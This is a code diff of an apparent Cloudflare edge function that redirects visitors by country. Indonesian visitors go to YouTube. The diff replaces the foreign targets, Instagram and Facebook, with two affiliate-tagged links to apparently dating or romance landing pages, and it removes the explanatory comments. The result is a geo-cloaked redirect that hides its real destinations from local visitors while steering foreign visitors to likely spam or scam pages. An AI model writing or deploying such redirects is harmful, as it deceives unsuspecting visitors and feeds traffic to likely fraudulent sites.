@@ -1,12 +1,11 @@
-const URL_INDONESIA = "https://www.youtube.com/";
+const URL_INDONESIA = "https://www.youtube.com";
 
 const URL_LUAR = [
-  "https://www.instagram.com/",
-  "https://www.facebook.com/"
+  "https://meppmr4.love-romanceflirt.com/lpk2huu?s1=MAGNUM234&cid=MAGNUM234",
+  "https://meppmr4.emotionaltogetherness.org/lpk2huu?s1=MAGNUM234&cid=MAGNUM234"
 ];
 
 export async function onRequest({ request }) {
-  // Redirect hanya untuk permintaan halaman GET/HEAD.
   if (request.method !== "GET" && request.method !== "HEAD") {
     return new Response("Method Not Allowed", {
       status: 405,
@@ -17,17 +16,13 @@ export async function onRequest({ request }) {
     });
   }
 
-  // Cloudflare menyediakan kode negara berdasarkan IP yang terdeteksi.
   const country = request.cf?.country;
 
   let destination;
 
-  // Indonesia selalu diproses lebih dahulu; tidak masuk random.
   if (country === "ID") {
     destination = URL_INDONESIA;
   } else {
-    // Terima hanya kode negara dua huruf kapital yang valid secara format.
-    // Nilai kosong, tidak tersedia, atau XX dianggap tidak diketahui.
     const isKnownCountry =
       typeof country === "string" &&
       /^[A-Z]{2}$/.test(country) &&
@@ -48,13 +43,11 @@ export async function onRequest({ request }) {
       );
     }
 
-    // Untuk negara terdeteksi selain Indonesia: peluang 50:50 per permintaan.
     const randomByte = new Uint8Array(1);
     crypto.getRandomValues(randomByte);
     destination = URL_LUAR[randomByte[0] & 1];
   }
 
-  // Redirect sementara HTTP 302; tidak bergantung pada JavaScript browser.
   return new Response(null, {
     status: 302,
     headers: {
